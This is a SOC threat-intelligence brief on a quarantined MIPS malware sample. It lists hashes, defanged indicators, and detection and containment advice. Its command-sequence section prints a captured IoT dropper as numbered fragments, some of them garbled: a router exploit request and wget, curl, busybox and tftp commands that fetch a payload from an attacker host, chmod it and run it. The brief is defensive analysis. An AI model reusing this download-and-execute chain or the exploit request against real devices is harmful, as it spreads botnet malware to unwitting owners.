# SOC Brief

## Executive summary

A quarantined payload was recovered from attacker-referenced infrastructure and published as defensive analysis material. The repository does not store it as a directly executable binary. Raw bytes are archived as base64 text for controlled lab use.

## Artifact

| Field | Value |
|---|---|
| Artifact ID | `82064` |
| SHA256 | `cad9e90cb8998664e5b39e7336c2310016f5b29704296a1070d950fa40ea8e41` |
| SHA1 | `5e848778ec4fbfddc94b5a76e5a56bf2e5173ce3` |
| MD5 | `620c007093f64dfe672252c0bd483f25` |
| Size | `448624` bytes |
| Format | `ELF32 big-endian executable/shared object, machine=MIPS, entry=0x400260` |
| Source URL | `hxxp://154[.]90[.]70[.]23/mips` |
| Analysis state | `needs_review` |
| Quarantined | `1` |

## Attack chain

1. Attacker activity referenced a payload URL.
2. Command trace indicates download and execution-attempt behavior when present.
3. Oraculo safe-fetch recovered the payload into quarantine without execution.
4. The repository published defensive analysis, metadata, IOCs, YARA and a base64 raw archive.

## Observed command sequence

1. `POST /boaform/adminformLogout//boaform/admin/formPing6 HTTP/1[.]1`  
   Meaning: observed command fragment.
2. `wget -nc hxxp://45[.]87[.]174[.]8/k[.]php?a=mips,99N97OK5FN9K9D75H -O [.]/upnpsetup`  
   Meaning: download payload or remote script.
3. `cd /tmp 2>/dev/null`  
   Meaning: change working directory.
4. `cd /var/tmp 2>/dev/null`  
   Meaning: change working directory.
5. `cd /dev/shm 2>#!/bin/sh`  
   Meaning: attempt execution.
6. `HOST="91[.]199[.]133[.]133:8080"`  
   Meaning: observed command fragment.
7. `BIN=/tmp/[.]n`  
   Meaning: observed command fragment.
8. `/dev/null`  
   Meaning: observed command fragment.
9. `ARCH=""`  
   Meaning: observed command fragment.
10. `CPUINFO=$(cat /proc/cpuinfo 2>/dev/null | head -20)`  
   Meaning: observed command fragment.
11. `case "$CPUINFO" in`  
   Meaning: observed command fragment.
12. `*mips*el*|*MIPS*el*|*mips*le*) ARCH="mipsel"`  
   Meaning: observed command fragment.
13. `*mips*|*MIPS*) ARCH="mips"`  
   Meaning: observed command fragment.
14. `*arm*|*ARM*)`  
   Meaning: observed command fragment.
15. `if echo "$CPUINFO" | grep -q "v7"`  
   Meaning: observed command fragment.
16. `then ARCH="armv7l"`  
   Meaning: observed command fragment.
17. `elif echo "$CPUINFO" | grep -q "aarch64\|armv8\|arm64"`  
   Meaning: observed command fragment.
18. `then ARCH="arm"`  
   Meaning: observed command fragment.
19. `else ARCH="arm"`  
   Meaning: observed command fragment.
20. `fi`  
   Meaning: observed command fragment.
21. `*x86_64*|*amd64*|*AMD64*) ARCH="x86_64"`  
   Meaning: observed command fragment.
22. `*i486*|*i586*|*i686*|*Intel*) ARCH="x86_64"`  
   Meaning: observed command fragment.
23. `*powerpc*|*ppc*|*PowerPC*) ARCH="powerpc"`  
   Meaning: observed command fragment.
24. `*)`  
   Meaning: observed command fragment.
25. `UNAME=$(uname -m 2>/dev/null)`  
   Meaning: observed command fragment.
26. `case "$UNAME" in`  
   Meaning: observed command fragment.
27. `mips) ARCH="mips"`  
   Meaning: observed command fragment.
28. `mipsel) ARCH="mipsel"`  
   Meaning: observed command fragment.
29. `arm*) ARCH="arm"`  
   Meaning: observed command fragment.
30. `aarch64) ARCH="arm"`  
   Meaning: observed command fragment.
31. `x86_64) ARCH="x86_64"`  
   Meaning: observed command fragment.
32. `i*86) ARCH="x86_64"`  
   Meaning: observed command fragment.
33. `*) ARCH="mips"`  
   Meaning: observed command fragment.
34. `# default fallback`  
   Meaning: observed command fragment.
35. `esac`  
   Meaning: observed command fragment.
36. `esac`  
   Meaning: observed command fragment.
37. `case "$ARCH" in`  
   Meaning: observed command fragment.
38. `armv7l|armv5l|armv4l|arm) REAL_ARCH="arm"`  
   Meaning: observed command fragment.
39. `mips) REAL_ARCH="mips"`  
   Meaning: observed command fragment.
40. `mipsel) REAL_ARCH="mipsel"`  
   Meaning: observed command fragment.
41. `x86_64|i486) REAL_ARCH="x86_64"`  
   Meaning: observed command fragment.
42. `powerpc) REAL_ARCH="arm"`  
   Meaning: observed command fragment.
43. `# fallback to arm`  
   Meaning: observed command fragment.
44. `*) REAL_ARCH="mips"`  
   Meaning: observed command fragment.
45. `(wget hxxp://$HOST/real_$REAL_ARCH -O $BIN 2>/dev/null`  
   Meaning: download payload or remote script.
46. `chmod (curl -s hxxp://$HOST/real_$REAL_ARCH -o $BIN 2>/dev/null`  
   Meaning: download payload or remote script.
47. `chm(busybox wget hxxp://$HOST/real_$REAL_ARCH -O $BIN 2>/dev/null &(tftp -g -r real_$REAL_ARCH $HOST -l $BIN 2>/dev/null`  
   Meaning: download payload or remote script.
48. `chmod 7esac`  
   Meaning: change permissions to make file executable.
49. `777 $BIN`  
   Meaning: observed command fragment.
50. `$BIN)`  
   Meaning: observed command fragment.


## Indicators

### URLs

- `hxxp://154[.]90[.]70[.]23/mips`


### IPs

- `119.0.0.0`
- `120.0.0.0`
- `154.90.70.23`


### Domains

- No domain indicators extracted from strings.


## Detection opportunities

- Match SHA256, SHA1 and MD5 in endpoint, EDR and malware telemetry.
- Hunt for download, chmod and execution-attempt chains.
- Search proxy, DNS, IDS and honeypot logs for the source URL or host.
- Use YARA as a starting point, not as final family attribution.

## Containment and hardening

- Block confirmed malicious infrastructure where appropriate.
- Alert on suspicious execution from temporary writable directories.
- Monitor embedded Linux and IoT-like systems for unexpected outbound downloads.
- Keep decoded raw material inside isolated malware-analysis labs.

## Confidence and limitations

Confidence is medium for delivery and execution-attempt context. Full capability assessment requires deeper reversing or controlled dynamic analysis.
